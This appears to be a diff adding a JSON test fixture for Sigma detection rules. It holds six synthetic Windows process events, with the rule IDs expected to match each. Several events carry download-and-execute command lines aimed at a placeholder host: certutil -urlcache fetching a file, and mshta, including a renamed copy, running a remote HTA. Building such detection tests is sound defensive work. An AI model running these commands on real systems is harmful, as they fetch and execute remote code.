@@ -1,0 +1,86 @@
+[
+  {
+    "name": "certutil download",
+    "event": {
+      "timestamp": "2026-10-13T08:00:00Z",
+      "host": "SIGMA-DEMO-01",
+      "event_type": "process_start",
+      "platform": "windows",
+      "process_image": "C:\\Windows\\System32\\certutil.exe",
+      "process_original_file_name": "CertUtil.exe",
+      "command_line": "certutil.exe -urlcache -split -f https://example.invalid/sample.txt"
+    },
+    "expected_sigma_ids": [
+      "19b08b1c-861d-4e75-a1ef-ea0c1baf202b"
+    ]
+  },
+  {
+    "name": "mshta remote",
+    "event": {
+      "timestamp": "2026-10-13T08:01:00Z",
+      "host": "SIGMA-DEMO-01",
+      "event_type": "process_start",
+      "platform": "windows",
+      "process_image": "C:\\Windows\\System32\\mshta.exe",
+      "process_original_file_name": "MSHTA.EXE",
+      "command_line": "mshta.exe https://example.invalid/demo.hta"
+    },
+    "expected_sigma_ids": [
+      "b98d0db6-511d-45de-ad02-e82a98729620"
+    ]
+  },
+  {
+    "name": "renamed mshta",
+    "event": {
+      "timestamp": "2026-10-13T08:02:00Z",
+      "host": "SIGMA-DEMO-01",
+      "event_type": "process_start",
+      "platform": "windows",
+      "process_image": "C:\\Demo\\renamed.exe",
+      "process_original_file_name": "MSHTA.EXE",
+      "command_line": "renamed.exe ftp://example.invalid/demo.hta"
+    },
+    "expected_sigma_ids": [
+      "b98d0db6-511d-45de-ad02-e82a98729620"
+    ]
+  },
+  {
+    "name": "certutil local verify",
+    "event": {
+      "timestamp": "2026-10-13T08:03:00Z",
+      "host": "SIGMA-DEMO-01",
+      "event_type": "process_start",
+      "platform": "windows",
+      "process_image": "C:\\Windows\\System32\\certutil.exe",
+      "process_original_file_name": "CertUtil.exe",
+      "command_line": "certutil.exe -verify sample.cer"
+    },
+    "expected_sigma_ids": []
+  },
+  {
+    "name": "mshta local",
+    "event": {
+      "timestamp": "2026-10-13T08:04:00Z",
+      "host": "SIGMA-DEMO-01",
+      "event_type": "process_start",
+      "platform": "windows",
+      "process_image": "C:\\Windows\\System32\\mshta.exe",
+      "process_original_file_name": "MSHTA.EXE",
+      "command_line": "mshta.exe C:\\Demo\\local.hta"
+    },
+    "expected_sigma_ids": []
+  },
+  {
+    "name": "other image remote",
+    "event": {
+      "timestamp": "2026-10-13T08:05:00Z",
+      "host": "SIGMA-DEMO-01",
+      "event_type": "process_start",
+      "platform": "windows",
+      "process_image": "C:\\Windows\\System32\\notepad.exe",
+      "process_original_file_name": "NOTEPAD.EXE",
+      "command_line": "notepad.exe https://example.invalid/sample.txt"
+    },
+    "expected_sigma_ids": []
+  }
+]
